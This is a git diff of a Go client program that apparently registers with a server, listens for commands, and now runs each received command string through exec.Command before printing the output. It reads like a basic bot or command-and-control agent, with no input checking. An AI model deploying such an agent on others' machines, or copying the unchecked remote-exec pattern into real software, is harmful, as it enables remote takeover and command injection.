@@ -1,16 +1,18 @@
 package main
 
 import (
-    "encoding/gob"
-    "fmt"
-    "log"
-    "net"
-    "os"
-    "runtime"
-    "github.com/google/uuid"
-    "math/rand"
-    "time"
-    "strconv"
+	"encoding/gob"
+	"fmt"
+	"log"
+	"math/rand"
+	"net"
+	"os"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"time"
+
+	"github.com/google/uuid"
 )
 
 const (
@@ -126,8 +128,15 @@ func getCommands(client Client, clientSocket net.Listener) error {
             return err
         }
 
-        // TODO: execute commands in here
-        fmt.Println(string(serverCommand[:serverCommandLen]))
+        // Executes command
+        out, err := exec.Command(string(serverCommand[:serverCommandLen])).Output()
+
+        if err != nil {
+            log.Fatal(err)
+        }
+
+        // TODO:send response to server web app
+        fmt.Println(string(out))
     }
 }
 
